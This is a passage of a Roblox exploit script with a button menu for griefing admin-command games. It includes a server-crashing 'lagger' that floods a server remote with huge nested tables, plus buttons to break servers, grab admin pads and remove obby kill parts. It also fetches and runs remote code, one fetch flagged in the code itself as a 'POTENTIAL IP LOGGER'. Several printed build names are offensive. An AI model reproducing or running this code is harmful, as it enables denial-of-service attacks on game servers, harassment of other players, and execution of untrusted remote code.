            logn("You are currently using NoAdmin Lagger v2.3")
            repeat
                wait()
            until game.CoreGui:FindFirstChild("RobloxPromptGui")

            local lp, po, ts =
                game:GetService("Players").LocalPlayer,
                game.CoreGui.RobloxPromptGui.promptOverlay,
                game:GetService("TeleportService")

            po.ChildAdded:connect(
                function(a)
                    if a.Name == "ErrorPrompt" then
                        repeat
                            execCmd("rejoin");wait(10)
                            ts:Teleport(game.PlaceId)
                            wait(2)
                        until false
                    end
                end)
            --// sus
getgenv().Toggled=false
getgenv().KeyBind="C"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'
local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end
local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 table.insert(spammedtable, {})
 z = spammedtable[1]
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end
bomb(290, 8) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
            --[[local table1 = {}
            local table2 = {}

            local function loop(v1, v2)
                for i = v1, v2 do
                    table.insert(table1, table2)
                end
            end

            local function crash(v1)
                for i = 1, v1 do
                    table.insert(table2[1], {})
                end

                if 4999999 / (v1 + 2) then
                    loop(1, 4999999 / (v1 + 2))
                else
                    loop(1, 4999999)
                end
                game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
            end

            table.insert(table2, {})
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            crash(250)
            wait()
            local debuginfo = {infCount = 0}
            setfpscap(60)

            function debuginfo:new()
                local guif = {}
                local gui = Instance.new("ScreenGui")
                if syn then
                    syn.protect_gui(gui)
                end
                gui.Parent = game.CoreGui.RobloxGui
                gui.Name = math.random(10000, 99999)
                gui.ResetOnSpawn = false

                function guif:newInfo(text)
                    local frame = {}

                    local text = text or ""

                    local nText = Instance.new("TextLabel", gui)
                    nText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    nText.Size = UDim2.new(0, 190, 0, 22)
                    nText.Position = UDim2.new(0, 0, 0, 300 + (debuginfo.infCount * 14))
                    nText.Font = Enum.Font.SourceSans
                    nText.TextSize = 14
                    nText.TextXAlignment = Enum.TextXAlignment.Right
                    nText.TextColor3 = Color3.fromRGB(255, 255, 255)
                    nText.BorderSizePixel = 0

                    function frame:updateText(newText)
                        text = newText
                    end

                    spawn(
                        function()
                            game:GetService("RunService").RenderStepped:Connect(
                                function()
                                    nText.Text = text
                                    nText.Size = UDim2.new(0, 10000, 0, 10000)
                                    nText.Size = UDim2.new(0, nText.TextBounds.X + 10, 0, nText.TextBounds.Y)
                                end
                            )
                        end
                    )

                    debuginfo.infCount = debuginfo.infCount + 1

                    return frame
                end

                return guif
            end

            local Config = {Strength = 3000, Amount = 0}

            local APITarpit = debuginfo:new()
            local Title = APITarpit:newInfo("// MTL Tarpit Stats \\\\")
            local Strength = APITarpit:newInfo("KeepAliveRate: " .. Config.Strength)
            local SEPLatency = APITarpit:newInfo("X->S SRVCheck: " .. 34832234 .. " : 3842")
            local TimeBefore = os.clock()
            local Resp = game.ReplicatedStorage.DefaultChatSystemChatEvents.GetInitDataRequest:InvokeServer()
            repeat
                game:GetService("RunService").RenderStepped:Wait()
            until Resp
            local EPSLatency =
                APITarpit:newInfo("EP->S Latency *LATEST_INCOMING_REQUEST: " .. os.clock() - TimeBefore .. "ms")
            local SX = APITarpit:newInfo("EP->S Latency *SPCLAT: " .. math.random() .. "s")

            game:GetService("RunService").RenderStepped:Connect(
                function()
                    for i = 1, Config.Strength do
                        game:GetService("LogService"):RequestServerHttpResult()
                        game:GetService("LogService"):RequestServerOutput()
                    end
                end)

                while wait(.05) do
                    SX:updateText(
                        "EP->S Latency *SPCLAT: " .. math.random() .. "s IT->R *SPCLAT: " .. math.random(1, 30) .. "." .. math.random())
                    EPSLatency:updateText("LS->S Clock *SERVER_TIME_CLOCK_DIF: " .. workspace:GetServerTimeNow() - os.time() .. "s")
                end ]]
        end
    )

    addBtn(
        "iy",
        function(v)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() ;wait(13.5)
            execCmd("showguis")
            execCmd("unkeepiy")
        end
    )

    addBtn(
        "*stop spam",
        function(v)
            game.Players:Chat("//stop")
        end
    )

    addBtn(
        "Silent cmds",
        function(v)
            local invisGUIS = {} --- from infinite yeild
            Players = game:GetService("Players")

            function FindInTable(tbl, val)
                if tbl == nil then
                    return false
                end
                for _, v in pairs(tbl) do
                    if v == val then
                        return true
                    end
                end
                return false
            end

            for i, v in pairs(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
                if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
                    v.Visible = true
                    if not FindInTable(invisGUIS, v) then
                        table.insert(invisGUIS, v)
                    end
                end
            end
        end
    )

    addBtn(
        "findregen2",
        function(v)
            logn("Only use this if toregen ain't working")
            logn("Also this won't work if you have infinite yield opened up")
           --loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
            cht("fly me");wait(3.5)
            execCmd("fly 1000")
            execCmd("unkeepiy")
            cht("//cframelocatereg")
            cht("//movedb")
            execCmd("fly 1000")
            execCmd("showguis");wait(6.5)
            cht("//up");wait(8.8)
            cht("//toregen");wait(12.5)
            cht("//loopgrab")
            execCmd("autorj")
            logn("you're currently loopgrabbing")
            logn("If it still couldn't find the regen then rip it's gone")
            logn("If it still couldn't find the regen then rip it's gone");wait(10)
            cht("/allpads");wait(4.5)
            cht("//movedb")
            cht("//up");wait(3.75)
            --loadstring(game:HttpGet(('POTENTIAL IP LOGGER!'),true))();wait(1.65)
            cht("///repott")
            logn("Scanning possible voidcoords")
            loadstring(
                game:HttpGet(("POTENTIAL IP LOGGER!"), true)
            )()
            logn("Try to use the Noadmin lagger now or/and use findregen3 \n if you still didn't get the pad")
        end
    )

	addBtn("findregen3 (rarely works)", function()
		cht("//movedb")
		local root = plyrs.LocalPlayer.Character.HumanoidRootPart
	
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(i * 10000, i * 10000, i * 10000))
		end
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(-(i * 10000), -(i * 10000), -(i * 10000)))
		end


		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(-(i * 10000), i * 10000, i * 10000))
		end
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(i * 10000, -(i * 10000), -(i * 10000)))
		end
	end)

    addBtn(
        "BreakServer",
        function(v)
            cht("/moveresetpadpiss");wait(10)
            cht("/trap others");wait()
            cht("/permpiss");wait(.35)
            cht("//loopgrab")
            cht("//breakbp");wait()
            say(".gg/65yHbG4Wfa");wait(5)
            cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
            cht("/moveresetpad");wait(10)
            cht(":unflash");wait(.1)
            cht("//crazycolors");wait()
            cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ");wait(5)
            cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ");wait(5)
            cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ");wait(5)
            cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
        end
    )

    addBtn(
        "House",
        function(v)
            cht("/house ")
        end
    )

    addTlg(
        "AntiLogs",
        function(v)
            cht("/toggle antilogs " .. math.random(1, 1000))
        end,
        function()
            cht("/toggle antilogs " .. math.random(1, 1000))
        end
    )

    addBtn(
        "Logs",
        function(v)
            cht("logs viewing be like xd")
        end
    )

    addBtn(
        "*cmds",
        function(v)
            cht("//cmds")
        end
    )

    addBtn(
        "*Builds",
        function(v)
		logn("Press F9 \n Also check your clipboard")
		createKohlsUi(
                {
			"--------------------Shortcut v2 Premium--------------------",
			"-Community builds-",
			"-Open the console to view them-",
			"\n\n-Every build gets approved-\n Make sure the file is called savedthings.lua \n Located in | Workspace \n \n \n \n Credit: Funzysdeath"
		}
            )
		print("--------------------Shortcut v2 Premium-------------------- \n Remaking the Shortcut v2 Build platform isn't allowed under any circumstances ©. Remaking our tools ''save/load'' or the build loader in-general requires credit to be given. \n We were the first to implement this but skids can't get their own ideas and started forking our open source parts and made their own btools out of it \n \n \n \n \n \n \n \n \n \n \n Size Rating: \n 1-4 = Tiny \n 5-11 = Small \n 12-19 = Medium \n 20-29 = Big \n 30+ = Large  60+ = :O badge, 100+ = ☆☆☆ badge, \n If paint is required then a''Requires manual'' owner note will be added under the build \n Types: Obby, Generic, Object, Recreation, Game Changer (RARE), Paint,\n \n Max 32 char (absolutely capped to the max) \n \n \n \n | Available builds |")
		print("Fixmap 1.0/2.0 - Stock")
		print("Bricks splitter - Stock (Makes it easier to move the building bricks as they're so close to each other which can result in bugs)")
        print("Horizontal pads fixer - Stock (This will fix all the pads correctly)\n")
		print("House blocker - Creator: Tech (702990207590596690) Size: Small, 5 parts, Type: Generic")
		print("obby pretty hard still i reuplo- Creator: Kozy (817032429918224414) Size: Big, 25 Parts, Type: Obby")
		print("blocks the obby with the bricks- Creator: Kozy (817032429918224414) Size: Small, 10 Parts, Type: Obby")
		print("cool parkour- Creator: Kozy (817032429918224414) Size: Medium, 12 Parts, Type: Obby")
		print("obby blocker v2- Creator: Kozy (817032429918224414) Size: Tiny, 3 Parts, Type: Generic")
		print("PvP Area- Creator: Damix (947582657481564190) Size: Medium, 13 Parts, Type: Recreation")
		print("dick- Creator: Damix (947582657481564190) Size: Small, 6 Parts, Type: Object")
		print("ahegao- Creator: Damix (947582657481564190) Size: Big, 28 Parts, Type: Reaction")
		print("small dance floor- Creator: Damix (947582657481564190) Size: Medium, 17 Parts, Type: Recreation")
		print("Jar- Creator: Damix (947582657481564190) Size: Small, 8 Parts, Type: Object")
		print("Hitlers Stand- Creator: Damix (947582657481564190) Size: Big, 27 Parts, Type: Recreation")
		print("obby for admin- Creator: Kozy (817032429918224414) Size: Medium, 17 Parts, Type: Obby")
		print("SCV2- Creator: Damix (947582657481564190) Size: Medium, 19 Parts, Type: Object")
		print("pads blocker- Creator: Kozy (817032429918224414) Size: Tiny, 3 Parts, Type: Generic")
		print("spawn blocker- Creator: Kozy (817032429918224414) Size: Small, 7 Parts, Type: Generic")
		print("Obby- Creator: Damix (947582657481564190) Size: Large, 62 Parts :O, Type: Obby")
		print("obbyandpadblocker- Creator: humanoid/me_kevin3050ti (924227593782308895) Size: Big, 21 Parts, Type: Obby")
		print("myobbysucks- Creator: Rick Astley/Deontae15508970 (748029205559771186) Size: Large, 41 Parts, Type: Obby")
		print("slide- Creator: Damix (947582657481564190) Size: Small, 9 Parts, Type: Generic")
		print("Invisible obby- Creator: Tech__ (702990207590596690) Size: Tiny, 1 Part, Type: Generic")
		print("fakeregen- Creator: Damix (947582657481564190) Size: Small, 5 Parts, Type: Recreation \n Requires manual ''paint to paint all parts to Bright violet'',")
		print("ofrad- Creator: Kozy (817032429918224414) Size: Large, 47 Parts, Type: Obby")
        print("ofrad v2- Creator: Kozy (817032429918224414) Size: Large, 68 Parts :O, Type: Obby")
        print("bad obby- Creator: quiving (611591635599622155) Size: Large, 86 Parts :O, Type: Obby")
        print("ihangpeople- Creator: Damix (947582657481564190) Size: Large, 37 Parts, Type: Generic")
        print("hut- Creator: Kozy (817032429918224414) Size: Large, 30 Parts, Type: Generic")
        print("umbrella- Creator: Kozy (817032429918224414) Size: Big, 23 Parts, Type: Object \n Requires manual paint to ''paint the bottom grey and top blue'',")
        print("obby blocker and padblocker- Creator: ダーク/me_blanky (812300369283121192) Size: Medium, 19 Parts, Type: Generic")
        print("insane room- Creator: Kozy (817032429918224414) Size: Large, 5 Parts, Type: Generic \n Requires manual ''combine this with //blackout'',")
        print("improved insane room- Creator: Kozy (817032429918224414) Size: Large, 113 Parts ☆☆☆, Type: Generic")
        print("box template- Creator: Damix (947582657481564190) Size: Large, 52 Parts, Type: Generic")
        print("big hut- Creator: Kozy (817032429918224414) Size: Large, 64 Parts, Type: Generic")
        print("some obby i made with <@!433050- Creator: ダーク/me_blanky (812300369283121192) Size: Medium, 16 Parts, Type: Obby")
        print("Fake slot 1 perm pad dex- Creator: Tech__ (702990207590596690) Size: Tiny, 1 Part, Type: Recreation \n Requires manual ''paint it to bright green``")
        print("fake admin pad- Creator: Damix (947582657481564190) Size: Tiny, 1 Part, Type: Recreation")
        print("random build- Creator: Damix (947582657481564190) Size: Medium, 17 Part, Type: Generic")
        print("spawncage v2- Creator: ダーク/me_blanky (812300369283121192) Size: Small, 10 Parts, Type: Generic")
        print("house jail- Creator: 9etie (348183894677520394) Size: Medium, 15 Parts, Type: Generic")
		print("\n \n \n \n You have Shortcut v2 Premium sooo, you can get started by pressing K to get SS Btools. \n Also it's recommended to have infinite yield loaded up when you're gonna build \n Have fun building")
		setclipboard("Link to the Shortcut v2 build platform https://discord.com/channels/918344197201866782/981880266232590376/981883275297562684 You can load and publish your builds here")
		execCmd("partpath")
	end
    )
--charcheck

--charcheck
    addBtn(
        "antiVampireCrash",
        function(v)
            cht("/toggle anticrashvg")
            logn("Having this enabled may cause lag the longer you're in the game. AntiVamp & Musicchanges")
           -- loadstring(game:HttpGet(("https://pastebin.com/raw/cNf69CQC"), true))()
            logn("Moved to the bottom as well along with antiflash because of possible lag")
        end
    )

    addBtn(
        "EnableEmojis",
        function(v)
            cht("//emoji")
            cht("s")
        end
    )

    addBtn(
        "Mymusiconly",
        function(v)
            cht("music 0000000000000000000000006423320268");wait(2)
            cht(":pm me My music only has been toggled On or Off")
            cht("/toggle mymusiconly")
        end
    )

    addBtn(
        "Fixpaint",
        function(v)
            cht("/color all original");wait(6.5)
            cht("ungear me")
        end
    )

    addBtn(
        "FixBaseplate",
        function(v)
            cht("//fixbp");wait(6.5)
            logn("It's ever so slightly off but I can't change that...")
        end
    )

    addBtn(
        "FixPads",
        function(v)
            cht("//fixpads");wait(6.5)
            logn("It only somewhat fixes vertical pads \n Use the Builds for a regular pad fixer")
        end
    )

    addBtn(
        "Tabcheck",
        function(v)
            autoafk = true
            logn("//untabcheck disables this")
        end
    )

    addBtn(
        "Toregen",
        function(v)
            cht("//findresetpad")
        end
    )

    addBtn(
        "loadpads",
        function(v)
            cht("//spam /skydive " .. math.random(1, 1000));wait(3.5)
            cht("/pads");wait(.5)
            cht("//stop");wait(4.5)
            cht("/pads")
            cht("setgrav me -9e9");wait()
            cht("/pads")
            cht("/perm");wait()
            cht("/pads");wait()
            cht("/pads");wait(3.5)
            cht("unchar me")
        end
    )

    addBtn(
        "Fixcamera",
        function(v)
            cht("//fixcam")
            cht("unblind me")
        end
    )

    addBtn(
        "padsenforcements",
        function(v)
            padAbuse = false
            temploopgrab = false ;wait(.35)
            cht("/toggle padsenforcements")
            logn("People can or cannot get more than 2 pads now depending on if you enabled it or disabled it")
        end
    )

    addTlg(
        "AntiAttach",
        function(v)
            antiattach = true
            cht(
                "h \n \n \n Server Message: Attaching to objects using the Sit & Stun Glitch has been Disabled in this server. \n \n \n "
            )
        end,
        function()
            antiattach = false
            cht(
                "h \n \n \n The map: You guys may now use the attach glitch to touch and mess me up now. Remember I have a pipi so be careful \n \n \n "
            )
        end
    )

    addTlg(
        "F3x instead of btools",
        function(v)
            cht("/bind btools |nan|");wait(.65)
            cht("/bind btoolz k")
            logn("Client f3x will be given to you instead. Check the console")
            print("You can use client f3x to move things on the server just don't use ''copy'' or ''resize''. After you moved the parts save them with the save tool then rejoin and use the load tool on the same parts. It should move them on the server with the Ivory \n \n \n Credit: Damix")
        end,
        function()
            cht("/bind btoolz |nan|")
            cht("/bind btools k")
            logn("Btools have been reverted")
        end
    )

    addTlg(
        "AntiGears",
        function(v)
            cht("ungear aIl 000000000000000000000000000000000000000000000000000000000000000000000 others");wait()
            cht("//antigearon")
            antiFun = true
        end,
        function()
            antiFun = false
            antigear = false
        end
    )

    addTlg(
        "AntiLag",
        function(v)
            antiParticles = true
            antiRageTable = true
            fpsboost = true
            execCmd("boostfps")
            execCmd("clrchar")
        end,
        function()
            antiParticles = false
            antiRageTable = false
            fpsboost = false
        end
    )

    --[[addTlg(
        "AntiDog",
        function(v)
            antiDog = true
            cht("_antidogon")
        end,
        function()
            antiDog = false
            cht("_antidogoff")
        end
    )]]

    addTlg(
        "AntiSpeed",
        function(v)
            antiSpeed = true
        end,
        function()
            antiSpeed = false ;wait(2)
            cht("refresh me")
        end
    )

    addTlg(
        "ServerHop",
        function(v)
            cht("/shop")
            local x = {}
            for _, v in ipairs(
                game:GetService("HttpService"):JSONDecode(
                    game:HttpGetAsync(
                        "https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100"
                    )
                ).data
            ) do
                if type(v) == "table" and v.maxPlayers > v.playing then
                    x[#x + 1] = v.id
                    amount = v.playing
                end
            end
            if #x > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, x[math.random(1, #x)]) ;wait(3.5)
                cht("/srj");wait(1)
                cht("/super /srj")
            end
        end
    )

    addBtn(
        "RegenPads",
        function(v)
            fireclickdetector(adminFlr.Regen.ClickDetector, 0)
        end
    )

    addBtn(
        "Swords",
        function(v)
            cht(":pm me Tools will be given shortly.")
            cht("gear me 000000000000000000000159229806")
            cht("gear me 0000000000000000233520257")
            cht("gear me 0000000000000000000000120307951")
            cht("gear me 000000000000000000080661504")
            cht("gear me 0000000000000000000000093136802")
            cht("gear me 0000000000000000000099119240")
            cht("gear me 00000000000000000000000073829193")
            cht("gear me 000000000000000000000139577901")
            cht("gear me 0000000000000000000000002544549379");wait(3)
            logn("Type //ivory for the Ivory Periastron")
        end
    )
    addBtn(
        "Guns",
        function(v)
            cht(":pm me Tools will be given shortly.")
            cht("gear me 0000000000000000000000000000000000000000116693764");wait(.35)
            cht("gear me 000000000000000000000000000000000000000212296936");wait(.35)
            cht("gear me 00000000000000000000000000000000000065082275")
            cht("gear me 00000000000000000000000000000000000090718350");wait(.35)
            cht("gear me 00000000000000000000000000000018268645")
            cht("gear me 000000000000000000000000000000139578207")
            cht("gear me 000000000000000000000000000000139578207");wait(.35)
            cht("gear me 00000000000000000000000000000097885508")
        end
    )
	addBtn(
        "AllPads",
        function(v)
		local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
		for i, pad in pairs(pads) do
			coroutine.wrap(
                    function()
				pcall(
                            function()
					local cre = pad.Head
					local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
					firetouchinterest(cre, spr, 1)
					wait()
					firetouchinterest(cre, spr, 0);
					wait(1)
					cht("/allpadspiss")
				end)
			end)()
		end
	end
    )
	addTlg(
        "*Perm",
        function()
		perm = true
		cht("/regpiss")
	end,
        function()
		perm = false
	end
    )
	addBtn(
        "*NoObbyKill (NOK)",
        function(v)
		local objs = gameFlr.Workspace.Obby:GetChildren()
		for i, obj in pairs(objs) do
			coroutine.wrap(function()
				pcall(function()
					obj.TouchInterest:Destroy()
				end)
			end)()
		end
	end
    )
	addBtn(
        "*Executor Specs",
        function(v)
		logn("Open the console (F9)")
		--loadstring(game:HttpGet(('https://pastebin.com/raw/7kkf9UFa'), true))()
	end
    )
	addBtn(
        "no touch interests Perm",
        function(v)
		logn("It's really slow")
		cht("/permpiss")
	end
    )
	local CLEFDV = false
    addTlg(
        "antiPunish | RISK",
        function()
		cht("//up")
		cht("//ap")
		logn("Enabling this may cause other antis to not work");
		logn("And the bans ain't working either then for some reason")
		CLEFDV = true
		coroutine.wrap(function()
				while CLEFDV and scriptActive do
					wait(0.0095)
					if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
						cht(
                                        "h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nFail \n \n \n \n \n \n \n \n \n \n \n \n don't try again."
                                    )
						cht("unpunish me")
						cht("/spam unpunish me " .. math.random(1, 1000))
						cht("//up");
						wait(0.22)
						cht("unpunish me " .. math.random(1, 1000))
						cht(
                                        "unpunish 000000000000000000000000000000000000000000000000000000000000000000000000000000 random " ..
                                            math.random(1, 1000)
                                    ) ;
						wait(.33)
						cht("unpunish me " .. math.random(1, 1000))
						cht(":refresh me " .. math.random(1, 1000))
						cht("/trap others")
						cht("/stop " .. math.random(1, 1000));
						wait(5)
						cht(
                                        ":refresh 000000000000000000000000000000000000000000000000000000000000000000000000000000 others " ..
                                            math.random(1, 1000))
					end
                end
		end)()
	end,
        function()
		CLEFDV = false
	end
    )
	local ELFRGD = false
	addTlg(
        "AntiKill",
        function()
		ELFRGD = true
		coroutine.wrap(function()
				while ELFRGD and scriptActive do
					wait(0.50)
					if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
						cht("reset me " .. math.random(1, 1000))
						cht("god 00000000000000000000000000000000000000 me " .. math.random(1, 1000))
					end
				end
		end)()
	end,
        function()
		ELFRGD = false
	end
    )
	local OELRDC = false
	addTlg(
        "AutoHeal",
        function()
		OELRDC = true
		coroutine.wrap(function()
			pcall(function()
				while OELRDC and scriptActive do
					wait(0.50)
					local hlth = game.Players.LocalPlayer.Character.Humanoid.Health
					if hlth ~= 0 and hlth ~= 100 then
						cht("heal me 99" .. math.random(1, 99))
					end
				end
			end)
		end)()
	end,
        function()
		OELRDC = false
	end
    )

	addTlg(
        "AntiBlind",
        function()
		antiBlind = true
	end,
        function()
		antiBlind = false
	end
    )

    --[[addTlg(
        "antiFlash",
        function()
            antiFlash = true
            logn("This can be quite laggy. Moved to the bottom for that reason")
           -- loadstring(game:HttpGet(("https://pastebin.com/raw/4LS0wQNt"), true))()
            cht("unflash")
        end,
        function()
            antiFlash = false
        end
    )]]

    addTlg(
        "AntiSetgrav",
        function()
            antiSetgrav = true
        end,
        function()
            antiSetgrav = false
            cht("unchar me,me,me")
        end
    )

    addBtn(
        "AntiTeleport",
        function()
            -- configuration
            logn("It goes away when you reset. Use //oldantitp for the old one which doesn't")
            local distance = 1

            -- services
            local ws = game:GetService("Workspace")
            local plyrs = game:GetService("Players")

            -- tables
            -- configuration
            local distance = 1

            -- services
            local ws = game:GetService("Workspace")
            local plyrs = game:GetService("Players")

            -- tables
            local connections = {}

            -- variables
            local lp = plyrs.LocalPlayer
            local chra = lp.Character
            local pr = chra.HumanoidRootPart
            local cam = ws.CurrentCamera

            local lastPos = nil

            -- functions
            local function floor(vec)
                return Vector3.new(math.floor(vec.X), math.floor(vec.Y), math.floor(vec.Z))
            end

            local function concatVec(vec)
                return table.concat({vec.X, vec.Y, vec.Z}, ", ")
            end

            -- code
            local connection1 =
                cam:GetPropertyChangedSignal("CFrame"):Connect(
                function()
                    local cur = pr.CFrame
                    if lastPos == nil then
                        lastPos = pr.CFrame
                        return
                    end
                    local magnitude = (floor(lastPos.p) - floor(cur.p)).Magnitude
                    if magnitude >= distance + 1 then
                        pr.CFrame = lastPos

                        print("Teleported back! (Magnitude: " .. magnitude .. ")")
                        print("(" .. concatVec(floor(lastPos.p)) .. "), (" .. concatVec(floor(cur.p)) .. ")")
                        --cht("jump 0000000000000000000000000000000000000000000000 me")
                        return
                    end

                    lastPos = pr.CFrame
                end)
            table.insert(connections, connection1)

            print("Loaded! AntiTP made by yeemi<3#9764")

            repeat
                wait()
            until chra == nil
            print("Ejecting... AntiTP made by yeemi<3#9764")

            for i, v in pairs(connections) do
                v:Disconnect()
            end
            return
        end
    )

    --

    --[[ Anti-Ideas:
	
	for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
		if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "EFFECTGUIBLIND" or v.Name == "HintGUI" then
			v:Destroy()
		end
	end
	for i,v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
		if v.Name == "Message" then
			v:Destroy()
		end
	end
	
	AntiBlind
	AntiJail
	AntiMusic
	AntiVGCrash
	AntiDog
	AntiSmoke
	AntiSwag
	AntiSparkles
	AntiFire
	AntiSpeed
	AntiSkydive
	AntiCrash
	AntiFreeze
	AntiSeizure
	AntiFF
	AntiMsgCrash
	AntiGrayscale
	AntiSize
	AntiRespawn
	AntiTeleport
	AntiShutdown
	AntiFly
	AntiTool
	AntiAttach
	AntiFling
	AntiVoid

	]] local size =
        UIGridLayout.AbsoluteContentSize -- Set GUI Virutal size
    ScrollingFrame.CanvasSize = UDim2.new(0, size.X, 0, size.Y)
end
coroutine.wrap(NKEI_fake_script)()
local function QIQVS_fake_script() -- CloseUI.LocalScript
    local script = Instance.new("LocalScript", CloseUI)

    script.Parent.MouseButton1Click:Connect(function()
            scriptActive = false
            script.Parent.Parent.Parent:Destroy()
            game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", true)
            PlayerList:Destroy()
        end)
end
coroutine.wrap(QIQVS_fake_script)()
local function VGXONZ_fake_script() -- Frame.MguiD
    local script = Instance.new("LocalScript", Frame)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
            end
        end)

    gui.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end)

    UserInputService.InputChanged:Connect(
        function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
end
coroutine.wrap(VGXONZ_fake_script)()
local function EAZWOTE_fake_script() -- SCv2_ButtonList.MguiD
    local script = Instance.new("LocalScript", SCv2_ButtonList)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
            end
        end)

    gui.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end)

    UserInputService.InputChanged:Connect(
        function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
end
coroutine.wrap(EAZWOTE_fake_script)()

wait(1.5)
cht("/unadmin")
perm = false

function say(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

wait(5.5)
cht("/unadmin")
perm = false

--end

lp.Chatted:Connect(
    function(msg)
        local args = msg:split(" ")
        if args[1]:lower():sub(1, 1) ~= "/" then
            return
        else
            args[1] = args[1]:lower():sub(2)
        end
        if args[1] == "loopgrab" then
            local suc, er =
                pcall(
                function()
                    permtoggles[tonumber(args[2])] = true
                    fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
                    coroutine.resume(perm[tonumber(args[2])])
                end)
            if not suc then
                print(er)
            end
        elseif args[1] == "unloopgrab" then
            local suc, er =
                pcall(
                function()
                    permtoggles[tonumber(args[2])] = false ;wait(0.1)
                    fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
                end)
            if not suc then
                print(er)
            end
        elseif args[1] == "loopregen" then
            loopregentoggle = true
            coroutine.resume(loopregen)
        elseif args[1] == "unloopregen" then
            loopregentoggle = false
        end
    end
)

--end
